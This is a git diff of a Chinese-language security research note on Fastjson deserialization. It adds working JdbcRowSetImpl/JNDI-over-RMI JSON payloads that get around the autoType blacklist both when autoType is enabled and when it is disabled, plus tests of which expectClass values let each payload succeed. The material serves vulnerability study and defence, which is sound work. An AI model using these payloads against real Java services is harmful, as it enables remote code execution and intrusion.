@@ -783,12 +783,15 @@ public class Test {
 
 ##### autoType开启的情况下绕过黑名单
 
-**Payload**
+**利用前提**：fastjson显式开启autoType
+
+**Payload1**
 
 ```java
 String fastSer =  "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
 ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
 JSON.parseObject(fastSer);
+// 在开启autoTypeSupport的情况下，显示指定expectClass只要为JdbcRowSetImpl父类也不影响Payload
 ```
 
 **分析**
@@ -954,14 +957,41 @@ if (className.startsWith("L") && className.endsWith(";")) {
 
 ##### autoType默认关闭的情况下绕过autoType和黑名单
 
-我们还使用之前的Payload打一下
+**利用前提**：autoType关闭&&(没有指定expectClass||expectClass为指定类型的Class)
+
+**Payload2**
 
 ```java
-String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
-ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+        String fastSer = "{ \"A\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}, \"B\": {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\",\"autoCommit\":\"true\"} }";
+
+        JSON.parseObject(fastSer); // 成功
+//        JSON.parseObject(fastSer,Object.class); // 成功
+//        JSON.parseObject(fastSer, Serializable.class); // 成功 
+//        JSON.parseObject(fastSer, Wrapper.class); // 失败
+//        JSON.parseObject(fastSer, JdbcRowSet.class); // 失败
+//        JSON.parseObject(fastSer, BaseRowSet.class); // 失败
+//        JSON.parseObject(fastSer,com.sun.rowset.JdbcRowSetImpl.class); // 失败
 ```
 
+这就导致了一个问题，在autoType显式开启的情况下，Payload2无法发挥作用
 
+##### autoType设置与expectClass
+
+前面给出的Payload1中，显式开启autoType时，测试了没有expectClass和有expectClass（为恶意类父类）这两种情况，都可以成功打payload。从开发角度来说，开启autoType后不显式指定expectClass是常见的写法。后面给出了Payload2，可以在autoType关闭的情况下利用成功，但是从开发角度来说，没有显示开启autoType，显示指定expectClass是常见写法，而攻击者在该场景下能够遇到可以利用的expectClass是比较难得的，这样看来Payload2的适用场景没有Payload1的广泛
+
+##### expectClass如何影响Payload发挥作用
+
+```java
+        String fastSer =  "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
+//        JSON.parseObject(fastSer,Object.class);  // 失败
+        JSON.parseObject(fastSer, Serializable.class);  // 失败
+//        JSON.parseObject(fastSer, Wrapper.class); // 成功
+//        JSON.parseObject(fastSer, JdbcRowSet.class); // 成功
+//        JSON.parseObject(fastSer, BaseRowSet.class); // 成功
+//        JSON.parseObject(fastSer,com.sun.rowset.JdbcRowSetImpl.class); // 成功
+```
+
+前面也分析过显式指定expectClass这种写法，但是无法解答一个新的问题，即Payload1在没有开启autoType的情况下，为什么有些expectClass可以发挥作用，有些没办法发挥作用，当然这里挑选的都是`JdbcRowSetImpl`父类和实现的接口。
 
 #### 1.2.25<=Fastjson<=1.2.41
 
@@ -982,6 +1012,8 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupp
 #### fastjson关键版本探测
 
 #### 服务器环境探测
+
+#### 补充：成功探测
 
 ### 工具
 
